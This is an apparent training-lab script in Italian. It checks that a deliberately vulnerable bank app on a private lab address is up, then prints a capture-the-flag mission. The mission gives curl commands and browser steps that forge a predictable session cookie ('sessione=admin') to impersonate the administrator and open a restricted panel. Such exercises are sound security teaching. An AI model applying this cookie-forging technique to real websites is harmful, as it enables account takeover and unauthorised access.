#!/usr/bin/env bash
# Lezione 15 · lato Kali · autenticazione, cookie e sessioni. Sola lettura.
set -uo pipefail
TARGET_IP="10.10.10.20"
echo "== Lezione 15 · Autenticazione, cookie e sessioni =="
echo
if curl -s -o /dev/null -m 4 "http://${TARGET_IP}:8080/"; then
  echo "[OK] La Banca risponde su :8080."
else
  echo "[--] La Banca non risponde. Sul bersaglio:  lab 12  e poi  lab 15 ."
fi
cat <<'MSG'

------------------------------------------------------------
 MISSIONE · Diventare un altro cambiando un biscotto
------------------------------------------------------------
 Dopo il login il sito ti da' un COOKIE di sessione per riconoscerti.
 Ma qui il cookie e' prevedibile: vale  sessione=<nomeutente> .

 Prima entra normalmente e guarda il tuo cookie:
        curl -i -d "utente=cliente&password=cliente" http://10.10.10.20:8080/login
        # nella risposta:  Set-Cookie: sessione=cliente

 [ ] 1  Impersona l'amministratore (furto di sessione)         (+35)
        curl -b "sessione=admin" http://10.10.10.20:8080/dashboard
        # vedi il conto e la nota dell'admin: c'e' la flag

 [ ] 2  Entra nel pannello riservato (controllo accessi rotto) (+35)
        curl -b "sessione=admin" http://10.10.10.20:8080/pannello

 In Firefox: F12 > Archiviazione > Cookie: cambia 'sessione' in 'admin'
 e ricarica /pannello.
------------------------------------------------------------
MSG
